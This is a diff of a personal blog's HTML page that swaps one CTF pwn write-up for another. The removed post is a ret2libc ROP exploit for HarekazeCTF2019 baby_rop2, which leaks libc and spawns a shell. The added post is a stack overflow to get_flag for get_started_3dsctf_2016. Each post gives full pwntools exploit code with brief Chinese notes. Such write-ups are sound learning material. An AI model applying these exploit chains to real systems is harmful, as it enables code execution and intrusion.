@@ -18,13 +18,13 @@
   
     <meta name="description" content="exp">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HarekazeCTF2019 baby_rop2">
-<meta property="og:url" content="https://isolator-1.github.io/2023/04/21/ctf-pwn/[HarekazeCTF2019]baby_rop2/index.html">
+<meta property="og:title" content="get_started_3dsctf_2016">
+<meta property="og:url" content="https://isolator-1.github.io/2023/04/21/ctf-pwn/get_started_3dsctf_2016/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
 <meta property="og:description" content="exp">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-04-21T03:24:00.000Z">
-<meta property="article:modified_time" content="2023-04-21T03:42:18.666Z">
+<meta property="article:published_time" content="2023-04-21T06:12:00.000Z">
+<meta property="article:modified_time" content="2023-04-21T06:17:11.390Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="ctf-pwn">
 <meta property="article:tag" content="exp">
@@ -32,7 +32,7 @@
   
   
   
-  <title>HarekazeCTF2019 baby_rop2 - Isolator&#39;s Blog</title>
+  <title>get_started_3dsctf_2016 - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +197,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="HarekazeCTF2019 baby_rop2"></span>
+            <span id="subtitle" data-typed-text="get_started_3dsctf_2016"></span>
           
         </div>
 
@@ -208,8 +208,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-04-21 11:24" pubdate>
-          April 21, 2023 am
+        <time datetime="2023-04-21 14:12" pubdate>
+          April 21, 2023 pm
         </time>
       </span>
     
@@ -220,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k words
+          600 words
         
       </span>
     
@@ -231,7 +231,7 @@
         
         
         
-          13 mins
+          6 mins
         
       </span>
     
@@ -269,26 +269,20 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">HarekazeCTF2019 baby_rop2</h1>
+            <h1 style="display: none">get_started_3dsctf_2016</h1>
             
             
               <div class="markdown-body">
                 
                 <p><strong>题目</strong></p>
-<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></p>
-<p>和前面一个题目同样，是一个构造rop链的栈溢出，虽然题目也给了libc文件，但是不是必要的</p>
-<p>前一个文章地址：<a href="https://isolator-1.github.io/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/">https://isolator-1.github.io/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/</a></p>
-<p><strong>方法</strong></p>
-<p>这道题目的差别或值得注意的地方在于</p>
-<ol>
-<li><p>不再是用puts函数（只需要一个参数），这道题目中可以用printf构造rop链</p>
-<p>printf有两个参数，除了rdi寄存器之外，还需要rsi寄存器来传递参数，但是这个程序里没有直接的<code>pop rsi, ret</code>的代码，只有一个<code>pop rsi, pop r15, ret</code>，因此需要再额外给r15在栈上留出一个空间。详见exp代码。</p>
-</li>
-<li><p>用read函数进行libc基地址泄露，虽然理论上用printf也可以，但是我不知道为什么没有成功，我在网上查的时候别人也有这个问题</p>
-</li>
-</ol>
+<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#get_started_3dsctf_2016">https://buuoj.cn/challenges#get_started_3dsctf_2016</a></p>
+<p>一道十分简单的栈溢出，将main的返回地址移交给自带的get_flag函数</p>
+<p>把这道题列出来的原因在于，程序没有开启标准输入输出，</p>
+<p>如果单纯执行完get_flag不设置一个正确的返回地址，这个函数里的输出显示不出来</p>
+<p>（详细原因目前也不是很清楚）</p>
 <p><strong>Exp</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&#x27;./babyrop2&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29507</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./babyrop2&#x27;</span>)<br><br>poprdi_ret = <span class="hljs-number">0x400733</span><br>poprsi_popr15_ret = <span class="hljs-number">0x400731</span><br>main = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>format_str = <span class="hljs-number">0x400790</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(format_str) + \<br>          p64(poprsi_popr15_ret) + p64(read_got) + p64(<span class="hljs-number">0</span>) + p64(printf_plt) + p64(main)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>,payload)<br><br>read_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read_addr:&#x27;</span> + <span class="hljs-built_in">hex</span>(read_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>, read_addr)<br>offset = read_addr - libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh = offset + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(poprdi_ret) + p64(binsh) + p64(system)<br><br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p>针对上述问题，选择exit函数作为get_flag的返回地址（不能放一个空着的p32(0)进去）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,27230)</span><br>p = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>get_flag = <span class="hljs-number">0x80489A0</span><br>param1 = <span class="hljs-number">0x308CD64F</span><br>param2 = <span class="hljs-number">0x195719D1</span><br><br>sleep(<span class="hljs-number">0.1</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p32(get_flag) +p32(<span class="hljs-number">0x0804E6A0</span>) + p32(param1) + p32(param2)<br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
 
 
                 
@@ -337,8 +331,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>HarekazeCTF2019 baby_rop2</div>
-      <div>https://isolator-1.github.io/2023/04/21/ctf-pwn/[HarekazeCTF2019]baby_rop2/</div>
+      <div>get_started_3dsctf_2016</div>
+      <div>https://isolator-1.github.io/2023/04/21/ctf-pwn/get_started_3dsctf_2016/</div>
     </div>
     <div class="license-meta">
       
@@ -382,9 +376,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/04/21/ctf-pwn/bjdctf_2020_babyrop/" title="bjdctf_2020_babyrop">
+                      <a href="/2023/04/24/ctf-pwn/pwnable_simple_login/" title="pwnable_simple_login">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">bjdctf_2020_babyrop</span>
+                        <span class="hidden-mobile">pwnable_simple_login</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -392,8 +386,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/03/15/fuzz/fuzz/" title="FUZZ-AFL">
-                        <span class="hidden-mobile">FUZZ-AFL</span>
+                      <a href="/2023/04/21/ctf-pwn/bjdctf_2020_babyrop/" title="bjdctf_2020_babyrop">
+                        <span class="hidden-mobile">bjdctf_2020_babyrop</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
